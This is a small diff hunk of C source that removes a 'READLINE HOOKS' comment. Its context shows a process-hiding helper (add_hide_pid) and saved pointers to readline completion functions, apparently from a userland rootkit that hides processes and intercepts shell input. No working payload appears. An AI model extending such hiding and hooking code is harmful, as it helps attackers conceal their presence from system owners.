@@ -48,7 +48,6 @@ static void add_hide_pid(pid_t pid) {
     add_hide_name(buf);
 }
 
-// ====== READLINE HOOKS ======
 static char *(*orig_readline)(const char *) = NULL;
 static char **(*orig_rl_completion_matches)(const char *, rl_compentry_func_t *) = NULL;
 static char *(*orig_rl_filename_completion_function)(const char *, int) = NULL;
